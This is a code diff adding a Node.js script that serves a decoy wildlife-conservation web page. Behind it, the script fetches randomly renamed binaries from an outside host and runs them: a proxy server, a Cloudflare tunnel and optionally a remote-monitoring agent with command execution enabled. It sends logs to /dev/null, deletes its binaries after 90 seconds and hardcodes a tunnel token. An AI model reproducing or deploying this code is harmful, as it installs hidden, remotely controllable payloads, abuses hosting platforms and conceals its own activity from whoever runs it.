+const ARGO_AUTH = process.env.ARGO_AUTH || 'eyJhIjoiNTJhODQzYzdiZWNiZDFjMGEwNzU2YjFjZjQ5ODM5NDgiLCJ0IjoiOWE3NjUzZGEtMDdlOC00YTc5LWE0OWYtNTM3N2E0MmUxNjI5IiwicyI6IlptUmxNekl3TnpFdE9ERmhOUzAwTm1SbUxXSTFaREV0TkRaak9ESmpNemxtWlRsaiJ9';              // 固定隧道密钥json或token,留空即启用临时隧道,json获取地址：https://json.zone.id
+const ARGO_PORT = process.env.ARGO_PORT || 8001;            // 固定隧道端口,使用token需在cloudflare后台设置和这里一致
+const CFIP = process.env.CFIP || 'saas.sin.fan';            // 节点优选域名或优选ip  
+const CFPORT = process.env.CFPORT || 443;                   // 节点优选域名或优选ip对应的端口
+const NAME = process.env.NAME || 'freeym';                        // 节点名称
+
+// 创建运行文件夹
+if (!fs.existsSync(FILE_PATH)) {
+  fs.mkdirSync(FILE_PATH);
+  console.log(`${FILE_PATH} is created`);
+} else {
+  console.log(`${FILE_PATH} already exists`);
+}
+
+// 生成随机6位字符文件名
+function generateRandomName() {
+  const characters = 'abcdefghijklmnopqrstuvwxyz';
+  let result = '';
+  for (let i = 0; i < 6; i++) {
+    result += characters.charAt(Math.floor(Math.random() * characters.length));
+  }
+  return result;
+}
+
+// 全局常量
+const npmName = generateRandomName();
+const webName = generateRandomName();
+const botName = generateRandomName();
+const phpName = generateRandomName();
+let npmPath = path.join(FILE_PATH, npmName);
+let phpPath = path.join(FILE_PATH, phpName);
+let webPath = path.join(FILE_PATH, webName);
+let botPath = path.join(FILE_PATH, botName);
+let subPath = path.join(FILE_PATH, 'sub.txt');
+let listPath = path.join(FILE_PATH, 'list.txt');
+let bootLogPath = path.join(FILE_PATH, 'boot.log');
+let configPath = path.join(FILE_PATH, 'config.json');
+
+// 如果订阅器上存在历史运行节点则先删除
+function deleteNodes() {
+  try {
+    if (!UPLOAD_URL) return;
+    if (!fs.existsSync(subPath)) return;
+
+    let fileContent;
+    try {
+      fileContent = fs.readFileSync(subPath, 'utf-8');
+    } catch {
+      return null;
+    }
+
+    const decoded = Buffer.from(fileContent, 'base64').toString('utf-8');
+    const nodes = decoded.split('\n').filter(line => 
+      /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(line)
+    );
+
+    if (nodes.length === 0) return;
+
+    axios.post(`${UPLOAD_URL}/api/delete-nodes`, 
+      JSON.stringify({ nodes }),
+      { headers: { 'Content-Type': 'application/json' } }
+    ).catch((error) => { 
+      return null; 
+    });
+    return null;
+  } catch (err) {
+    return null;
+  }
+}
+
+// 清理历史文件
+function cleanupOldFiles() {
+  try {
+    const files = fs.readdirSync(FILE_PATH);
+    files.forEach(file => {
+      const filePath = path.join(FILE_PATH, file);
+      try {
+        const stat = fs.statSync(filePath);
+        if (stat.isFile()) {
+          fs.unlinkSync(filePath);
+        }
+      } catch (err) {
+        // 忽略所有错误，不记录日志
+      }
+    });
+  } catch (err) {
+    // 忽略所有错误，不记录日志
+  }
+}
+
+// 生成xr-ay配置文件
+async function generateConfig() {
+  const config = {
+    log: { access: '/dev/null', error: '/dev/null', loglevel: 'none' },
+    inbounds: [
+      { port: ARGO_PORT, protocol: 'vless', settings: { clients: [{ id: UUID, flow: 'xtls-rprx-vision' }], decryption: 'none', fallbacks: [{ dest: 3001 }, { path: "/vless-argo", dest: 3002 }, { path: "/vmess-argo", dest: 3003 }, { path: "/trojan-argo", dest: 3004 }] }, streamSettings: { network: 'tcp' } },
+      { port: 3001, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: UUID }], decryption: "none" }, streamSettings: { network: "tcp", security: "none" } },
+      { port: 3002, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: UUID, level: 0 }], decryption: "none" }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/vless-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
+      { port: 3003, listen: "127.0.0.1", protocol: "vmess", settings: { clients: [{ id: UUID, alterId: 0 }] }, streamSettings: { network: "ws", wsSettings: { path: "/vmess-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
+      { port: 3004, listen: "127.0.0.1", protocol: "trojan", settings: { clients: [{ password: UUID }] }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/trojan-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
+    ],
+    dns: { servers: ["https+local://8.8.8.8/dns-query"] },
+    outbounds: [ { protocol: "freedom", tag: "direct" }, {protocol: "blackhole", tag: "block"} ]
+  };
+  fs.writeFileSync(path.join(FILE_PATH, 'config.json'), JSON.stringify(config, null, 2));
+}
+
+// 判断系统架构
+function getSystemArchitecture() {
+  const arch = os.arch();
+  if (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') {
+    return 'arm';
+  } else {
+    return 'amd';
+  }
+}
+
+// 下载对应系统架构的依赖文件
+function downloadFile(fileName, fileUrl, callback) {
+  const filePath = fileName; 
+  
+  // 确保目录存在
+  if (!fs.existsSync(FILE_PATH)) {
+    fs.mkdirSync(FILE_PATH, { recursive: true });
+  }
+  
+  const writer = fs.createWriteStream(filePath);
+
+  axios({
+    method: 'get',
+    url: fileUrl,
+    responseType: 'stream',
+  })
+    .then(response => {
+      response.data.pipe(writer);
+
+      writer.on('finish', () => {
+        writer.close();
+        console.log(`Download ${path.basename(filePath)} successfully`);
+        callback(null, filePath);
+      });
+
+      writer.on('error', err => {
+        fs.unlink(filePath, () => { });
+        const errorMessage = `Download ${path.basename(filePath)} failed: ${err.message}`;
+        console.error(errorMessage); // 下载失败时输出错误消息
+        callback(errorMessage);
+      });
+    })
+    .catch(err => {
+      const errorMessage = `Download ${path.basename(filePath)} failed: ${err.message}`;
+      console.error(errorMessage); // 下载失败时输出错误消息
+      callback(errorMessage);
+    });
+}
+
+// 下载并运行依赖文件
+async function downloadFilesAndRun() {  
+  
+  const architecture = getSystemArchitecture();
+  const filesToDownload = getFilesForArchitecture(architecture);
+
+  if (filesToDownload.length === 0) {
+    console.log(`Can't find a file for the current architecture`);
+    return;
+  }
+
+  const downloadPromises = filesToDownload.map(fileInfo => {
+    return new Promise((resolve, reject) => {
+      downloadFile(fileInfo.fileName, fileInfo.fileUrl, (err, filePath) => {
+        if (err) {
+          reject(err);
+        } else {
+          resolve(filePath);
+        }
+      });
+    });
+  });
+
+  try {
+    await Promise.all(downloadPromises);
+  } catch (err) {
+    console.error('Error downloading files:', err);
+    return;
+  }
+  // 授权和运行
+  function authorizeFiles(filePaths) {
+    const newPermissions = 0o775;
+    filePaths.forEach(absoluteFilePath => {
+      if (fs.existsSync(absoluteFilePath)) {
+        fs.chmod(absoluteFilePath, newPermissions, (err) => {
+          if (err) {
+            console.error(`Empowerment failed for ${absoluteFilePath}: ${err}`);
+          } else {
+            console.log(`Empowerment success for ${absoluteFilePath}: ${newPermissions.toString(8)}`);
+          }
+        });
+      }
+    });
+  }
+  const filesToAuthorize = NEZHA_PORT ? [npmPath, webPath, botPath] : [phpPath, webPath, botPath];
+  authorizeFiles(filesToAuthorize);
+
+  //运行ne-zha
+  if (NEZHA_SERVER && NEZHA_KEY) {
+    if (!NEZHA_PORT) {
+      // 检测哪吒是否开启TLS
+      const port = NEZHA_SERVER.includes(':') ? NEZHA_SERVER.split(':').pop() : '';
+      const tlsPorts = new Set(['443', '8443', '2096', '2087', '2083', '2053']);
+      const nezhatls = tlsPorts.has(port) ? 'true' : 'false';
+      // 生成 config.yaml
+      const configYaml = `
+client_secret: ${NEZHA_KEY}
+debug: false
+disable_auto_update: true
+disable_command_execute: false
+disable_force_update: true
+disable_nat: false
+disable_send_query: false
+gpu: false
+insecure_tls: true
+ip_report_period: 1800
+report_delay: 4
+server: ${NEZHA_SERVER}
+skip_connection_count: true
+skip_procs_count: true
+temperature: false
+tls: ${nezhatls}
+use_gitee_to_upgrade: false
+use_ipv6_country_code: false
+uuid: ${UUID}`;
+      
+      fs.writeFileSync(path.join(FILE_PATH, 'config.yaml'), configYaml);
+      
+      // 运行 v1
+      const command = `nohup ${phpPath} -c "${FILE_PATH}/config.yaml" >/dev/null 2>&1 &`;
+      try {
+        await exec(command);
+        console.log(`${phpName} is running`);
+        await new Promise((resolve) => setTimeout(resolve, 1000));
+      } catch (error) {
+        console.error(`php running error: ${error}`);
+      }
+    } else {
+      let NEZHA_TLS = '';
+      const tlsPorts = ['443', '8443', '2096', '2087', '2083', '2053'];
+      if (tlsPorts.includes(NEZHA_PORT)) {
+        NEZHA_TLS = '--tls';
+      }
+      const command = `nohup ${npmPath} -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${NEZHA_TLS} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`;
+      try {
+        await exec(command);
+        console.log(`${npmName} is running`);
+        await new Promise((resolve) => setTimeout(resolve, 1000));
+      } catch (error) {
+        console.error(`npm running error: ${error}`);
+      }
+    }
+  } else {
+    console.log('NEZHA variable is empty,skip running');
+  }
+  //运行xr-ay
+  const command1 = `nohup ${webPath} -c ${FILE_PATH}/config.json >/dev/null 2>&1 &`;
+  try {
+    await exec(command1);
+    console.log(`${webName} is running`);
+    await new Promise((resolve) => setTimeout(resolve, 1000));
+  } catch (error) {
+    console.error(`web running error: ${error}`);
+  }
+
+  // 运行cloud-fared
+  if (fs.existsSync(botPath)) {
+    let args;
+
+    if (ARGO_AUTH.match(/^[A-Z0-9a-z=]{120,250}$/)) {
+      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${ARGO_AUTH}`;
+    } else if (ARGO_AUTH.match(/TunnelSecret/)) {
+      args = `tunnel --edge-ip-version auto --config ${FILE_PATH}/tunnel.yml run`;
+    } else {
+      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${FILE_PATH}/boot.log --loglevel info --url http://localhost:${ARGO_PORT}`;
+    }
+
+    try {
+      await exec(`nohup ${botPath} ${args} >/dev/null 2>&1 &`);
+      console.log(`${botName} is running`);
+      await new Promise((resolve) => setTimeout(resolve, 2000));
+    } catch (error) {
+      console.error(`Error executing command: ${error}`);
+    }
+  }
+  await new Promise((resolve) => setTimeout(resolve, 5000));
+
+}
+
+//根据系统架构返回对应的url
+function getFilesForArchitecture(architecture) {
+  let baseFiles;
+  if (architecture === 'arm') {
+    baseFiles = [
+      { fileName: webPath, fileUrl: "https://arm64.ssss.nyc.mn/web" },
+      { fileName: botPath, fileUrl: "https://arm64.ssss.nyc.mn/bot" }
+    ];
+  } else {
+    baseFiles = [
+      { fileName: webPath, fileUrl: "https://amd64.ssss.nyc.mn/web" },
+      { fileName: botPath, fileUrl: "https://amd64.ssss.nyc.mn/bot" }
+    ];
+  }
+
+  if (NEZHA_SERVER && NEZHA_KEY) {
+    if (NEZHA_PORT) {
+      const npmUrl = architecture === 'arm' 
+        ? "https://arm64.ssss.nyc.mn/agent"
+        : "https://amd64.ssss.nyc.mn/agent";
+        baseFiles.unshift({ 
+          fileName: npmPath, 
+          fileUrl: npmUrl 
+        });
+    } else {
+      const phpUrl = architecture === 'arm' 
+        ? "https://arm64.ssss.nyc.mn/v1" 
+        : "https://amd64.ssss.nyc.mn/v1";
+      baseFiles.unshift({ 
+        fileName: phpPath, 
+        fileUrl: phpUrl
+      });
+    }
+  }
+
+  return baseFiles;
+}
+
+// 获取固定隧道json
+function argoType() {
+  if (!ARGO_AUTH || !ARGO_DOMAIN) {
+    console.log("ARGO_DOMAIN or ARGO_AUTH variable is empty, use quick tunnels");
+    return;
+  }
+
+  if (ARGO_AUTH.includes('TunnelSecret')) {
+    fs.writeFileSync(path.join(FILE_PATH, 'tunnel.json'), ARGO_AUTH);
+    const tunnelYaml = `
+  tunnel: ${ARGO_AUTH.split('"')[11]}
+  credentials-file: ${path.join(FILE_PATH, 'tunnel.json')}
+  protocol: http2
+  
+  ingress:
+    - hostname: ${ARGO_DOMAIN}
+      service: http://localhost:${ARGO_PORT}
+      originRequest:
+        noTLSVerify: true
+    - service: http_status:404
+  `;
+    fs.writeFileSync(path.join(FILE_PATH, 'tunnel.yml'), tunnelYaml);
+  } else {
+    console.log("ARGO_AUTH mismatch TunnelSecret,use token connect to tunnel");
+  }
+}
+
+// 获取临时隧道domain
+async function extractDomains() {
+  let argoDomain;
+
+  if (ARGO_AUTH && ARGO_DOMAIN) {
+    argoDomain = ARGO_DOMAIN;
+    console.log('ARGO_DOMAIN:', argoDomain);
+    await generateLinks(argoDomain);
+  } else {
+    try {
+      const fileContent = fs.readFileSync(path.join(FILE_PATH, 'boot.log'), 'utf-8');
+      const lines = fileContent.split('\n');
+      const argoDomains = [];
+      lines.forEach((line) => {
+        const domainMatch = line.match(/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
+        if (domainMatch) {
+          const domain = domainMatch[1];
+          argoDomains.push(domain);
+        }
+      });
+
+      if (argoDomains.length > 0) {
+        argoDomain = argoDomains[0];
+        console.log('ArgoDomain:', argoDomain);
+        await generateLinks(argoDomain);
+      } else {
+        console.log('ArgoDomain not found, re-running bot to obtain ArgoDomain');
+        // 删除 boot.log 文件，等待 2s 重新运行 server 以获取 ArgoDomain
+        fs.unlinkSync(path.join(FILE_PATH, 'boot.log'));
+        async function killBotProcess() {
+          try {
+            if (process.platform === 'win32') {
+              await exec(`taskkill /f /im ${botName}.exe > nul 2>&1`);
+            } else {
+              await exec(`pkill -f "[${botName.charAt(0)}]${botName.substring(1)}" > /dev/null 2>&1`);
+            }
+          } catch (error) {
+            // 忽略输出
+          }
+        }
+        killBotProcess();
+        await new Promise((resolve) => setTimeout(resolve, 3000));
+        const args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${FILE_PATH}/boot.log --loglevel info --url http://localhost:${ARGO_PORT}`;
+        try {
+          await exec(`nohup ${botPath} ${args} >/dev/null 2>&1 &`);
+          console.log(`${botName} is running`);
+          await new Promise((resolve) => setTimeout(resolve, 3000));
+          await extractDomains(); // 重新提取域名
+        } catch (error) {
+          console.error(`Error executing command: ${error}`);
+        }
+      }
+    } catch (error) {
+      console.error('Error reading boot.log:', error);
+  }
+}
+
+// 获取isp信息
+async function getMetaInfo() {
+  try {
+    const response1 = await axios.get('https://api.ip.sb/geoip', { headers: { 'User-Agent': 'Mozilla/5.0', timeout: 3000 }});
+    if (response1.data && response1.data.country_code && response1.data.isp) {
+      return `${response1.data.country_code}-${response1.data.isp}`.replace(/\s+/g, '_');
+    }
+  } catch (error) {
+      try {
+        // 备用 ip-api.com 获取isp
+        const response2 = await axios.get('http://ip-api.com/json', { headers: { 'User-Agent': 'Mozilla/5.0', timeout: 3000 }});
+        if (response2.data && response2.data.status === 'success' && response2.data.countryCode && response2.data.org) {
+          return `${response2.data.countryCode}-${response2.data.org}`.replace(/\s+/g, '_');
+        }
+      } catch (error) {
+        // console.error('Backup API also failed');
+      }
+  }
+  return 'Unknown';
+}
+// 生成 list 和 sub 信息
+async function generateLinks(argoDomain) {
+  const ISP = await getMetaInfo();
+  const nodeName = NAME ? `${NAME}-${ISP}` : ISP;
+  return new Promise((resolve) => {
+    setTimeout(() => {
+      const VMESS = { v: '2', ps: `${nodeName}`, add: CFIP, port: CFPORT, id: UUID, aid: '0', scy: 'auto', net: 'ws', type: 'none', host: argoDomain, path: '/vmess-argo?ed=2560', tls: 'tls', sni: argoDomain, alpn: '', fp: 'firefox'};
+      const subTxt = `
+vless://${UUID}@${CFIP}:${CFPORT}?encryption=none&security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Fvless-argo%3Fed%3D2560#${nodeName}
+
+vmess://${Buffer.from(JSON.stringify(VMESS)).toString('base64')}
+
+trojan://${UUID}@${CFIP}:${CFPORT}?security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Ftrojan-argo%3Fed%3D2560#${nodeName}
+    `;
+      // 打印 sub.txt 内容到控制台
+      console.log(Buffer.from(subTxt).toString('base64'));
+      fs.writeFileSync(subPath, Buffer.from(subTxt).toString('base64'));
+      console.log(`${FILE_PATH}/sub.txt saved successfully`);
+      uploadNodes();
+      // 将内容进行 base64 编码并写入 SUB_PATH 路由
+      app.get(`/${SUB_PATH}`, (req, res) => {
+        const encodedContent = Buffer.from(subTxt).toString('base64');
+        res.set('Content-Type', 'text/plain; charset=utf-8');
+        res.send(encodedContent);
+      });
+      resolve(subTxt);
+      }, 2000);
+    });
+  }
+}
+
+// 自动上传节点或订阅
+async function uploadNodes() {
+  if (UPLOAD_URL && PROJECT_URL) {
+    const subscriptionUrl = `${PROJECT_URL}/${SUB_PATH}`;
+    const jsonData = {
+      subscription: [subscriptionUrl]
+    };
+    try {
+        const response = await axios.post(`${UPLOAD_URL}/api/add-subscriptions`, jsonData, {
+            headers: {
+                'Content-Type': 'application/json'
+            }
+        });
+        
+        if (response && response.status === 200) {
+            console.log('Subscription uploaded successfully');
+            return response;
+        } else {
+          return null;
+          //  console.log('Unknown response status');
+        }
+    } catch (error) {
+        if (error.response) {
+            if (error.response.status === 400) {
+              //  console.error('Subscription already exists');
+            }
+        }
+    }
+  } else if (UPLOAD_URL) {
+      if (!fs.existsSync(listPath)) return;
+      const content = fs.readFileSync(listPath, 'utf-8');
+      const nodes = content.split('\n').filter(line => /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(line));
+
+      if (nodes.length === 0) return;
+
+      const jsonData = JSON.stringify({ nodes });
+
+      try {
+          const response = await axios.post(`${UPLOAD_URL}/api/add-nodes`, jsonData, {
+              headers: { 'Content-Type': 'application/json' }
+          });
+          if (response && response.status === 200) {
+            console.log('Nodes uploaded successfully');
+            return response;
+        } else {
+            return null;
+        }
+      } catch (error) {
+          return null;
+      }
+  } else {
+      // console.log('Skipping upload nodes');
+      return;
+  }
+}
+
+// 90s后删除相关文件
+function cleanFiles() {
+  setTimeout(() => {
+    const filesToDelete = [bootLogPath, configPath, webPath, botPath];  
+    
+    if (NEZHA_PORT) {
+      filesToDelete.push(npmPath);
+    } else if (NEZHA_SERVER && NEZHA_KEY) {
+      filesToDelete.push(phpPath);
+    }
+
+    // Windows系统使用不同的删除命令
+    if (process.platform === 'win32') {
+      exec(`del /f /q ${filesToDelete.join(' ')} > nul 2>&1`, (error) => {
+        console.clear();
+        console.log('App is running');
+        console.log('Thank you for using this script, enjoy!');
+      });
+    } else {
+      exec(`rm -rf ${filesToDelete.join(' ')} >/dev/null 2>&1`, (error) => {
+        console.clear();
+        console.log('App is running');
+        console.log('Thank you for using this script, enjoy!');
+      });
+    }
+  }, 90000); // 90s
+}
+cleanFiles();
+
+// 自动访问项目URL
+async function AddVisitTask() {
+  if (!AUTO_ACCESS || !PROJECT_URL) {
+    console.log("Skipping adding automatic access task");
+    return;
+  }
+
+  try {
+    const response = await axios.post('https://oooo.serv00.net/add-url', {
+      url: PROJECT_URL
+    }, {
+      headers: {
+        'Content-Type': 'application/json'
+      }
+    });
+    // console.log(`${JSON.stringify(response.data)}`);
+    console.log(`automatic access task added successfully`);
+    return response;
+  } catch (error) {
+    console.error(`Add automatic access task faild: ${error.message}`);
+    return null;
+  }
+}
+
+// 主运行逻辑
+async function startserver() {
+  try {
+    argoType();
+    deleteNodes();
+    cleanupOldFiles();
+    await generateConfig();
+    await downloadFilesAndRun();
+    await extractDomains();
+    await AddVisitTask();
+  } catch (error) {
+    console.error('Error in startserver:', error);
+  }
+}
+startserver().catch(error => {
+  console.error('Unhandled error in startserver:', error);
+});
+
+// 根路由
+app.get("/", async function(req, res) {
+  const html = `<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>守护生灵 - 野生动物保护</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: -apple-system, 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif;
+      background: #0a1628;
+      color: #e0e8f0;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    /* 星空粒子背景 */
+    .stars {
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      pointer-events: none; z-index: 0;
+      background: radial-gradient(ellipse at 20% 50%, #0d2137 0%, #0a1628 100%);
+    }
+    .stars::before, .stars::after {
+      content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0;
+      background-image:
+        radial-gradient(2px 2px at 20px 30px, #ffffff33, transparent),
+        radial-gradient(2px 2px at 40px 70px, #ffffff22, transparent),
+        radial-gradient(1px 1px at 90px 40px, #ffffff44, transparent),
+        radial-gradient(1px 1px at 130px 80px, #ffffff33, transparent),
+        radial-gradient(2px 2px at 160px 30px, #ffffff22, transparent);
+      background-size: 200px 100px;
+      animation: twinkle 4s ease-in-out infinite alternate;
+    }
+    .stars::after { background-size: 300px 150px; animation-duration: 6s; }
+    @keyframes twinkle { from { opacity: 0.4; } to { opacity: 1; } }
+
+    /* 头部 */
+    header {
+      position: relative; z-index: 1;
+      text-align: center;
+      padding: 60px 20px 40px;
+      background: linear-gradient(180deg, rgba(16,42,76,0.8) 0%, transparent 100%);
+    }
+    header .logo { font-size: 56px; margin-bottom: 8px; animation: float 3s ease-in-out infinite; }
+    @keyframes float {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
+    }
+    header h1 {
+      font-size: 42px; font-weight: 800;
+      background: linear-gradient(135deg, #4ade80, #22d3ee, #818cf8);
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+      background-clip: text;
+      letter-spacing: 2px;
+    }
+    header p {
+      margin-top: 12px; font-size: 18px; color: #94a3b8;
+      max-width: 600px; margin-left: auto; margin-right: auto;
+      line-height: 1.6;
+    }
+
+    /* 统计数据 */
+    .stats {
+      position: relative; z-index: 1;
+      display: flex; justify-content: center; gap: 40px;
+      padding: 30px 20px; flex-wrap: wrap;
+    }
+    .stat-card {
+      text-align: center; padding: 24px 32px;
+      background: rgba(255,255,255,0.04);
+      border: 1px solid rgba(255,255,255,0.08);
+      border-radius: 16px;
+      backdrop-filter: blur(12px);
+      transition: transform 0.3s, box-shadow 0.3s;
+      min-width: 160px;
+    }
+    .stat-card:hover {
+      transform: translateY(-6px);
+      box-shadow: 0 12px 40px rgba(74,222,128,0.15);
+      border-color: rgba(74,222,128,0.3);
+    }
+    .stat-card .num {
+      font-size: 36px; font-weight: 800;
+      background: linear-gradient(135deg, #f97316, #ef4444);
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+    .stat-card .label { margin-top: 8px; font-size: 14px; color: #94a3b8; }
+
+    /* 动物卡片区 */
+    .section-title {
+      position: relative; z-index: 1;
+      text-align: center; font-size: 28px; font-weight: 700;
+      margin: 50px 0 30px;
+      color: #e2e8f0;
+    }
+    .section-title span {
+      background: linear-gradient(135deg, #4ade80, #22d3ee);
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .animals {
+      position: relative; z-index: 1;
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 24px; padding: 0 40px; max-width: 1200px; margin: 0 auto;
+    }
+    .animal-card {
+      background: linear-gradient(145deg, rgba(255,255,255,0.06), rgba(255,255,255,0.02));
+      border: 1px solid rgba(255,255,255,0.08);
+      border-radius: 20px; overflow: hidden;
+      transition: transform 0.4s, box-shadow 0.4s;
+    }
+    .animal-card:hover {
+      transform: translateY(-8px) scale(1.02);
+      box-shadow: 0 20px 60px rgba(34,211,238,0.12);
+    }
+    .animal-card .emoji {
+      font-size: 72px; text-align: center; padding: 36px 0 16px;
+      filter: drop-shadow(0 4px 12px rgba(0,0,0,0.3));
+    }
+    .animal-card .info { padding: 0 24px 28px; }
+    .animal-card h3 { font-size: 20px; color: #f1f5f9; margin-bottom: 4px; }
+    .animal-card .latin { font-size: 13px; color: #64748b; font-style: italic; margin-bottom: 12px; }
+    .animal-card .desc { font-size: 14px; color: #94a3b8; line-height: 1.7; }
+    .animal-card .tag {
+      display: inline-block; margin-top: 14px;
+      padding: 4px 14px; border-radius: 20px;
+      font-size: 12px; font-weight: 600;
+    }
+    .tag-cr { background: rgba(239,68,68,0.15); color: #f87171; border: 1px solid rgba(239,68,68,0.3); }
+    .tag-en { background: rgba(251,146,60,0.15); color: #fb923c; border: 1px solid rgba(251,146,60,0.3); }
+    .tag-vu { background: rgba(250,204,21,0.15); color: #facc15; border: 1px solid rgba(250,204,21,0.3); }
+
+    /* 行动呼吁 */
+    .cta {
+      position: relative; z-index: 1;
+      text-align: center; padding: 70px 20px 40px;
+    }
+    .cta h2 {
+      font-size: 32px; font-weight: 700; margin-bottom: 16px; color: #f1f5f9;
+    }
+    .cta p { font-size: 16px; color: #94a3b8; max-width: 560px; margin: 0 auto 30px; line-height: 1.7; }
+    .cta-actions { display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; }
+    .cta-btn {
+      display: inline-flex; align-items: center; gap: 8px;
+      padding: 14px 36px; border-radius: 50px; border: none;
+      font-size: 16px; font-weight: 600; cursor: pointer;
+      text-decoration: none; transition: all 0.3s;
+    }
+    .cta-btn.primary {
+      background: linear-gradient(135deg, #4ade80, #22d3ee);
+      color: #0a1628;
+    }
+    .cta-btn.primary:hover { transform: scale(1.06); box-shadow: 0 8px 30px rgba(74,222,128,0.4); }
+    .cta-btn.secondary {
+      background: rgba(255,255,255,0.06);
+      border: 1px solid rgba(255,255,255,0.15);
+      color: #e2e8f0;
+    }
+    .cta-btn.secondary:hover { background: rgba(255,255,255,0.12); transform: scale(1.06); }
+
+    /* 知识科普 */
+    .tips {
+      position: relative; z-index: 1;
+      max-width: 900px; margin: 20px auto 40px; padding: 0 40px;
+    }
+    .tip-item {
+      display: flex; align-items: flex-start; gap: 16px;
+      padding: 20px 24px; margin-bottom: 16px;
+      background: rgba(255,255,255,0.03);
+      border: 1px solid rgba(255,255,255,0.06);
+      border-radius: 14px;
+      transition: all 0.3s;
+    }
+    .tip-item:hover { background: rgba(255,255,255,0.06); border-color: rgba(74,222,128,0.2); }
+    .tip-item .icon { font-size: 28px; flex-shrink: 0; margin-top: 2px; }
+    .tip-item .text h4 { font-size: 16px; color: #e2e8f0; margin-bottom: 6px; }
+    .tip-item .text p { font-size: 14px; color: #94a3b8; line-height: 1.6; }
+
+    /* 页脚 */
+    footer {
+      position: relative; z-index: 1;
+      text-align: center; padding: 40px 20px;
+      border-top: 1px solid rgba(255,255,255,0.06);
+      color: #475569; font-size: 13px;
+    }
+    footer .hearts { font-size: 24px; margin-bottom: 10px; letter-spacing: 4px; }
+
+    @media (max-width: 640px) {
+      header h1 { font-size: 30px; }
+      header .logo { font-size: 42px; }
+      .stats { gap: 16px; }
+      .stat-card { min-width: 120px; padding: 16px 20px; }
+      .stat-card .num { font-size: 28px; }
+      .animals { padding: 0 16px; }
+      .tips { padding: 0 16px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="stars"></div>
+
+  <header>
+    <div class="logo">🌍</div>
+    <h1>守护生灵</h1>
+    <p>每一个物种的消逝，都是地球生命之书中被撕去的一页。<br>保护野生动物，就是守护我们共同的未来。</p>
+  </header>
+
+  <div class="stats">
+    <div class="stat-card">
+      <div class="num">41,000+</div>
+      <div class="label">受威胁物种</div>
+    </div>
+    <div class="stat-card">
+      <div class="num">1,000,000</div>
+      <div class="label">面临灭绝的物种</div>
+    </div>
+    <div class="stat-card">
+      <div class="num">68%</div>
+      <div class="label">野生动物种群下降</div>
+    </div>
+    <div class="stat-card">
+      <div class="num">150+</div>
+      <div class="label">每日灭绝物种数</div>
+    </div>
+  </div>
+
+  <h2 class="section-title">🦁 <span>濒危物种档案</span></h2>
+
+  <div class="animals">
+    <div class="animal-card">
+      <div class="emoji">🐼</div>
+      <div class="info">
+        <h3>大熊猫</h3>
+        <div class="latin">Ailuropoda melanoleuca</div>
+        <div class="desc">中国国宝，全球生物多样性保护的旗舰物种。由于栖息地破碎化，野外种群仅存约1,800只，经数十年保护已从濒危降级为易危。</div>
+        <span class="tag tag-vu">易危 VU</span>
+      </div>
+    </div>
+    <div class="animal-card">
+      <div class="emoji">🐅</div>
+      <div class="info">
+        <h3>华南虎</h3>
+        <div class="latin">Panthera tigris amoyensis</div>
+        <div class="desc">中国特有虎亚种，曾广泛分布于华南地区。因栖息地丧失与偷猎，野外已功能性灭绝，目前仅有少量圈养个体存活。</div>
+        <span class="tag tag-cr">极危 CR</span>
+      </div>
+    </div>
+    <div class="animal-card">
+      <div class="emoji">🐘</div>
+      <div class="info">
+        <h3>亚洲象</h3>
+        <div class="latin">Elephas maximus</div>
+        <div class="desc">地球上最大的陆地动物之一。因象牙贸易和栖息地缩减，全球野外种群不足5万头，中国境内仅约300头。</div>
+        <span class="tag tag-en">濒危 EN</span>
+      </div>
+    </div>
+    <div class="animal-card">
+      <div class="emoji">🐋</div>
+      <div class="info">
+        <h3>蓝鲸</h3>
+        <div class="latin">Balaenoptera musculus</div>
+        <div class="desc">地球上有史以来最大的动物，体长可达30米。20世纪商业捕鲸几乎将其推向灭绝，目前全球仅存约1万至2.5万头。</div>
+        <span class="tag tag-en">濒危 EN</span>
+      </div>
+    </div>
+    <div class="animal-card">
+      <div class="emoji">🦏</div>
+      <div class="info">
+        <h3>犀牛</h3>
+        <div class="latin">Rhinocerotidae</div>
+        <div class="desc">地球上最古老的哺乳动物之一，已在地球上生存超过5000万年。因犀角贸易猖獗，多个亚种已经灭绝，北白犀仅剩2头。</div>
+        <span class="tag tag-cr">极危 CR</span>
+      </div>
+    </div>
+    <div class="animal-card">
+      <div class="emoji">🦅</div>
+      <div class="info">
